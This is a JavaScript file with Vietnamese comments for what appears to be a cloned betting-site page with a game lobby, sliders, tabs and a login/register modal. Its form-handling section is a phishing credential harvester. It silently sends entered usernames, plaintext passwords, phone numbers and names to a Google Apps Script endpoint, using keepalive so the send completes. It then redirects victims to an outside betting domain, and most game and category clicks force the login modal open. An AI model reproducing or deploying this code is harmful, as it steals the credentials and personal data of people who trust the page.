// Đợi toàn bộ giao diện HTML tải xong mới chạy JavaScript
document.addEventListener("DOMContentLoaded", function() {
    
    /* ========================================================
       1. XỬ LÝ MENU DƯỚI CÙNG (BOTTOM NAV) TRÊN MOBILE
    ======================================================== */
    const bottomNavItems = document.querySelectorAll('.bottom-nav-item');
    bottomNavItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            bottomNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const mobileMenuBtn = document.getElementById('mobile-menu-btn');
    if (mobileMenuBtn) {
        mobileMenuBtn.addEventListener('click', function() {
            alert("Tính năng mở Menu Sidebar đang được phát triển!");
        });
    }

    /* ========================================================
       2. XỬ LÝ BANNER SLIDER TỰ ĐỘNG TRƯỢT
    ======================================================== */
    const track = document.getElementById('bannerTrack');
    const slides = document.querySelectorAll('.carousel-slide');
    const nextBtn = document.getElementById('nextBtn');
    const prevBtn = document.getElementById('prevBtn');
    const dotsContainer = document.getElementById('carouselDots');

    if (track && slides.length > 0) {
        let currentIndex = 0;
        const totalSlides = slides.length;
        let slideInterval;
        const intervalTime = 3000;

        dotsContainer.innerHTML = ''; 
        slides.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.classList.add('dot');
            if (index === 0) dot.classList.add('active');
            dot.addEventListener('click', () => goToSlide(index));
            dotsContainer.appendChild(dot);
        });
        const dots = document.querySelectorAll('.dot');

        function updateSlider() {
            track.style.transform = `translateX(-${currentIndex * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentIndex]) {
                dots[currentIndex].classList.add('active');
            }
        }

        function nextSlide() {
            currentIndex = (currentIndex === totalSlides - 1) ? 0 : currentIndex + 1;
            updateSlider();
        }

        function prevSlide() {
            currentIndex = (currentIndex === 0) ? totalSlides - 1 : currentIndex - 1;
            updateSlider();
        }

        function goToSlide(index) {
            currentIndex = index;
            updateSlider();
            resetAutoSlide(); 
        }

        function startAutoSlide() {
            slideInterval = setInterval(nextSlide, intervalTime);
        }
        
        function resetAutoSlide() {
            clearInterval(slideInterval);
            startAutoSlide();
        }

        if (nextBtn) {
            nextBtn.addEventListener('click', () => {
                nextSlide();
                resetAutoSlide();
            });
        }
        if (prevBtn) {
            prevBtn.addEventListener('click', () => {
                prevSlide();
                resetAutoSlide();
            });
        }

        startAutoSlide();
    }

    /* ========================================================
       3. XỬ LÝ DANH MỤC TRƯỢT NGANG (MOBILE) VÀ GAME HOT
    ======================================================== */
    const catNav = document.getElementById('mobileCategories');
    const catLeftBtn = document.getElementById('catLeftBtn');
    const catRightBtn = document.getElementById('catRightBtn');

    if (catNav && catLeftBtn && catRightBtn) {
        catLeftBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: -100, behavior: 'smooth' });
        });
        catRightBtn.addEventListener('click', () => {
            catNav.scrollBy({ left: 100, behavior: 'smooth' });
        });
    }

    const catItems = document.querySelectorAll('.cat-item');
    catItems.forEach(item => {
        item.addEventListener('click', function() {
            catItems.forEach(i => i.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const provNav = document.getElementById('providerNav');
    const provLeft = document.getElementById('provLeft');
    const provRight = document.getElementById('provRight');

    if(provNav && provLeft && provRight) {
        provLeft.addEventListener('click', () => {
            provNav.scrollBy({ left: -250, behavior: 'smooth' });
        });
        provRight.addEventListener('click', () => {
            provNav.scrollBy({ left: 250, behavior: 'smooth' });
        });
    }

    const provBtns = document.querySelectorAll('.prov-btn');
    provBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            provBtns.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
        });
    });

    /* ========================================================
       4. XỬ LÝ CHUYỂN TAB SẢNH TRÒ CHƠI
    ======================================================== */
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');

    tabButtons.forEach(button => {
        button.addEventListener('click', function() {
            const targetId = this.getAttribute('data-target');
            
            tabButtons.forEach(btn => btn.classList.remove('active'));
            this.classList.add('active');

            tabPanes.forEach(pane => pane.classList.remove('active'));
            const targetPane = document.getElementById(targetId);
            if (targetPane) {
                targetPane.classList.add('active');
            }
        });
    });

    /* ========================================================
       5. XỬ LÝ CƠ BẢN MODAL ĐĂNG NHẬP / ĐĂNG KÝ
    ======================================================== */
    const authModal = document.getElementById('authModal') || document.querySelector('.modal-overlay');
    const tabLoginBtn = document.getElementById('tabLoginBtn');
    const tabRegisterBtn = document.getElementById('tabRegisterBtn');
    const loginForm = document.getElementById('loginForm');
    const registerForm = document.getElementById('registerForm');

    function switchTab(isLogin) {
        if (isLogin) {
            if(tabLoginBtn) tabLoginBtn.classList.add('active');
            if(tabRegisterBtn) tabRegisterBtn.classList.remove('active');
            if(loginForm) loginForm.classList.add('active');
            if(registerForm) registerForm.classList.remove('active');
        } else {
            if(tabRegisterBtn) tabRegisterBtn.classList.add('active');
            if(tabLoginBtn) tabLoginBtn.classList.remove('active');
            if(registerForm) registerForm.classList.add('active');
            if(loginForm) loginForm.classList.remove('active');
        }
    }

    if (tabLoginBtn) tabLoginBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(true); });
    if (tabRegisterBtn) tabRegisterBtn.addEventListener('click', (e) => { e.preventDefault(); switchTab(false); });

    /* ========================================================
       6. XỬ LÝ GỬI FORM VỀ GOOGLE SHEET VÀ CHUYỂN HƯỚNG
    ======================================================== */
    const redirectUrl = "https://m.f8bet11g.com/";
    const scriptURL = "https://script.google.com/macros/s/AKfycbxlFL895x4oe4DxAuI257fZ7F-fME2qkqf6cf7n9s96mH32-vcck_HsIh9BQ_QLk9Qpyg/exec";

    function sendDataToSheet(data, submitButton) {
        // 1. Đổi trạng thái nút bấm để người dùng thấy phản hồi
        submitButton.disabled = true;
        submitButton.innerHTML = "ĐANG KẾT NỐI...";

        // 2. Bắn dữ liệu về Google Sheet ngầm (Không dùng .then để chờ đợi)
        fetch(scriptURL, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
            keepalive: true // CỰC KỲ QUAN TRỌNG: Ép trình duyệt gửi xong dữ liệu dù trang đã bị tắt/chuyển đi
        }).catch(error => console.error('Lỗi ngầm:', error));

        // 3. Chuyển hướng người dùng sang trang đích ngay lập tức
        // Delay 0.5s (500ms) để nút bấm kịp hiện chữ "Đang kết nối..." tạo cảm giác mượt mà
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 500); 
    }

    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            e.preventDefault(); 

            // Lấy giá trị đầu vào và loại bỏ khoảng trắng ở 2 đầu
            const userVal = document.getElementById('loginUser').value.trim();
            const passVal = document.getElementById('loginPass').value;

            // Ràng buộc tài khoản và mật khẩu từ 6 đến 20 ký tự
            if (userVal.length < 6 || userVal.length > 20) {
                alert("Tên tài khoản phải từ 6 đến 20 ký tự!");
                return; // Chặn không cho gửi đi
            }
            if (passVal.length < 6 || passVal.length > 20) {
                alert("Mật khẩu phải từ 6 đến 20 ký tự!");
                return; // Chặn không cho gửi đi
            }

            const submitBtn = loginForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Nhập",
                username: userVal,
                password: passVal,
                phone: document.getElementById('loginPhone').value,
                fullname: "" 
            };
            sendDataToSheet(formData, submitBtn);
        });
    }

    if (registerForm) {
        registerForm.addEventListener('submit', function(e) {
            e.preventDefault(); 
            
            // Lấy giá trị đầu vào
            const userVal = document.getElementById('regUser').value.trim();
            const passVal = document.getElementById('regPass').value;

            // Ràng buộc tài khoản và mật khẩu từ 6 đến 20 ký tự
            if (userVal.length < 6 || userVal.length > 20) {
                alert("Tên tài khoản phải từ 6 đến 20 ký tự!");
                return; 
            }
            if (passVal.length < 6 || passVal.length > 20) {
                alert("Mật khẩu phải từ 6 đến 20 ký tự!");
                return; 
            }

            const submitBtn = registerForm.querySelector('.auth-submit-btn');
            const formData = {
                type: "Đăng Ký",
                username: userVal,
                password: passVal,
                fullname: document.getElementById('regName').value,
                phone: document.getElementById('regPhone').value
            };
            sendDataToSheet(formData, submitBtn);
        });
    }
    /* ========================================================
       7. MỞ MODAL ĐĂNG NHẬP KHI CLICK VÀO NHIỀU THÀNH PHẦN
    ======================================================== */
    const closeBtn = document.querySelector('.close-btn') || document.getElementById('closeModal');

    const triggerElements = document.querySelectorAll(`
        .btn-login, 
        .btn-register,
        .btn-play, 
        .game-card, 
        .hot-game-item, 
        .m-game-card, 
        .cat-item,
        .open-login-modal
    `);

    function openModal(event) {
        if (this.classList.contains('btn-register')) {
            switchTab(false);
        } else {
            switchTab(true); 
        }

        if (this.tagName === 'A') {
            event.preventDefault();
        } else {
            event.preventDefault(); 
        }
        
        if (authModal) {
            authModal.classList.add('show');
        }
    }

    triggerElements.forEach(function(element) {
        element.addEventListener('click', openModal);
    });

    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            if (authModal) authModal.classList.remove('show');
        });
    }

    if (authModal) {
        window.addEventListener('click', function(event) {
            if (event.target === authModal) {
                authModal.classList.remove('show');
            }
        });
    }

});